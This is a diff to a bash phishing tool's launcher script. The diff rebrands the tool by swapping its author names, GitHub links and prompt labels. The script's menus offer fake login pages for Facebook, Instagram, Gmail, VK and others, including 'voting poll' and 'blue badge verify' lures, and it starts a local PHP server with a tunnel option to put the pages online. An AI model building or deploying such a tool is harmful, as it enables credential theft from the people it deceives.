@@ -82,11 +82,11 @@ echo -TC "_____________________________________________________________" | lolca
 echo -TC "TYPE      : PHISHING TOOL $green " |lolcat
 echo -TC "VERSION   : 1.0v " | lolcat
 echo -TC "TEMPLATES : 20+ TEMPLATES " | lolcat
-echo -TC "AUTHOR    : TECHNOCYBER & HACKERSPUNK $green " |lolcat
-echo -TC "INSTAGRAM : https://Instagram.com/Technocyber.sh $green " |lolcat
-echo -TC "INSTAGRAM : https://Instagram.com/Hackerspunk $green " |lolcat
-echo -TC "CONTACT   : +91 9960524818 (TECHNOCYBER) $green " |lolcat
-echo -TC "CONTACT   : +91 7365009054 (HACKERSPUNK)  " | lolcat
+echo -TC "AUTHOR    : GENIXCYBER & NETSLUTTER $green " |lolcat
+echo -TC "INSTAGRAM : https://Instagram.com/Genixcyber $green " |lolcat
+echo -TC "INSTAGRAM : https://Instagram.com/Netslutter $green " |lolcat
+echo -TC "CONTACT   : +91 9960524818 (GENIXCYBER) $green " |lolcat
+echo -TC "CONTACT   : +91 7365009054 (NETSLUTTER)  " | lolcat
 echo -TC "_____________________________________________________________" | lolcat
 
 }
@@ -113,7 +113,7 @@ printf "\e[0m                                                    \e[0m\n"
 printf "\e[0m"
 echo -e "                 DON'T ASK TO HACK! JUST HACK IT!"|lolcat
 echo " "
-echo -e $'\e[1;37m\e[0m\e[1;37m  <<+-+-+-+-+-+-+-+-+-+ WANTS TO LEARN HACKING ? +-+-+-+-+-+-+-+-+-+>>\e[0m'|lolcat
+echo -e $'\e[1;37m\e[0m\e[1;37m  <<+-+-+-+-+-+-+-+-+-+ WANT TO LEARN HACKING ? +-+-+-+-+-+-+-+-+-+>>\e[0m'|lolcat
 echo " "
 echo -e " <×•••••••••••••••••• JOIN US ON TELEGRAM ••••••••••••••••••••×>"|lolcat
 echo " "
@@ -138,7 +138,7 @@ printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[0m\e[96m Twitter     \e[0
 printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[0m\e[96m Playstation \e[0m\e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[0m\e[96m Reddit      \e[0m\e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m]\e[0m\e[0m\e[96m Exit\e[0m\n"                 
 printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[0m\e[96m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[0m\e[96m Adobe\e[0m\n"   
 printf "\e[0m\n"
-echo -e "╭─[TECHNOCYBER]" |lolcat
+echo -e "╭─[GENIXCYBER]" |lolcat
 read -p "   ╰─root@2Timeowl=" menu_option
 
 if [[ $menu_option == 1 || $menu_option == 01 ]]; then
@@ -231,9 +231,9 @@ elif [[ $menu_option == 99 ]]; then
 about
 elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
 printf "\e[0m\n"
-printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Technocyber for more\e[0m\n"
+printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Genixyber for more\e[0m\n"
 printf "\e[0m\n"
-printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Punker-Bhai for more\e[0m\n"
+printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/Netslutter for more\e[0m\n"
 printf "\e[0m\n"
 exit 1
 
@@ -253,7 +253,7 @@ printf "   \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Advanced Votin
 printf "   \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[0m\e[96m Fake Security Login Page\e[0m\n"
 printf "   \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[0m\e[96m Facebook Messenger Login Page\e[0m\n"
 echo ""
-echo -e "╭─[TECHNOCYBER]" |lolcat
+echo -e "╭─[GENIXCYBER]" |lolcat
 read -p "   ╰─root@2Timeowl=" fb_option
 
 if [[ $fb_option == 1 || $fb_option == 01 ]]; then
@@ -283,7 +283,7 @@ printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Traditional Logi
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Auto Followers Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[0m\e[96m Blue Badge Verify Login Page\e[0m\n"
 printf "\e[0m\n"
-echo -e "╭─[TECHNOCYBER]" |lolcat
+echo -e "╭─[GENIXCYBER]" |lolcat
 read -p "   ╰─root@2Timeowl=" ig_option
 
 
@@ -311,7 +311,7 @@ printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Gmail Old Login 
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Gmail New Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[0m\e[96m Advanced Voting Poll\e[0m\n"
 printf "\e[0m\n"
-echo -e "╭─[TECHNOCYBER]" |lolcat
+echo -e "╭─[GENIXCYBER]" |lolcat
 read -p "   ╰─root@2Timeowl=" gmail_option
 
 
@@ -338,7 +338,7 @@ printf " \n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Traditional Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Advanced Voting Poll Login Page\e[0m\n"
 printf "\e[0m\n"
-echo -e "╭─[TECHNOCYBER]" |lolcat
+echo -e "╭─[GENIXCYBER]" |lolcat
 read -p "   ╰─root@2Timeowl=" vk_option
 
 if [[ $vk_option == 1 || $vk_option == 01 ]]; then
@@ -370,11 +370,11 @@ printf "\e[0m\e[96m (__) (____)   (__)  (____)(___/(_) (_)(____)(_)\_)   {V: 1.0
 printf "\e[0m\n"
 printf "    \e[0m\e[1;44m Most Advanced Phishing Tool of 2021 with 20+ Templates\e[0m\n"
 printf "\e[0m\n"
-printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m TECHNOCYBER & HACKERSPUNK \e[0m\e[91m[\e[0m\e[93m IRI70 \e[0m\e[91m]\e[0m\n"
+printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m GENIXCYBER & NETSLUTTER \e[0m\e[91m[\e[0m\e[93m IRI70 \e[0m\e[91m]\e[0m\n"
 printf "\e[0m\n"
-printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/TechnoCyber\e[0m\n"
+printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/Genixcyber\e[0m\n"
 printf "\e[0m\n"
-printf "\e[0m\e[92m  GITHUB \e[0m\e[91m  : \e[0m\e[96mhttps://github.com/Punker-Bhai\e[0m\n"
+printf "\e[0m\e[92m  GITHUB \e[0m\e[91m  : \e[0m\e[96mhttps://github.com/Netslutter\e[0m\n"
 printf "\e[0m\n"
 printf "\e[0m\e[92m  VERSION \e[0m\e[91m    : \e[0m\e[93m1.0\e[0m\n"
 printf "\e[0m\n"
@@ -384,7 +384,7 @@ printf "\e[0m\n"
 sleep 3
 printf " \e[0m\e[91m[\e[0m00\e[0m\e[91m]\e[0m\e[93m Home           \e[0m\e[91m[\e[0m99\e[0m\e[91m]\e[0m\e[93m Exit\e[0m\n"
 printf "\e[0m\n"
-echo -e "╭─[TECHNOCYBER]" |lolcat
+echo -e "╭─[GENIXCYBER]" |lolcat
 read -p "   ╰─root@2Timeowl=" about_option
 
 if [[ $about_option == 0 || $about_option == 00 ]]; then
@@ -439,7 +439,7 @@ echo -e "\e[91m                        ║        \e[93mType\e[92m 02\e[91m     
 echo -e "\e[96m                        ║                       ║"
 echo -e "\e[96m                        ╚═══════════════════════╝"
 printf "\e[0m\n"
-echo -e "╭─[TECHNOCYBER]" |lolcat
+echo -e "╭─[GENIXCYBER]" |lolcat
 read -p "   ╰─root@2Timeowl=" tunnel_menu
 tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"
 
@@ -471,8 +471,6 @@ printf " \e[1;31m[\e[0m\e[1;77m/\e[0m\e[1;31m]\e[0m\e[1;92m      Initializing...
 cd .gnx/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 echo " ----------------------------------------->>>>>"|lolcat
 sleep 2
-
-#THANKS ABHACKEROFFICIAL FOR LOGO
 
 printf "\e[0m\n"
 printf "\e[0m            \e[0m                           \e[0m            \e[0m\n"
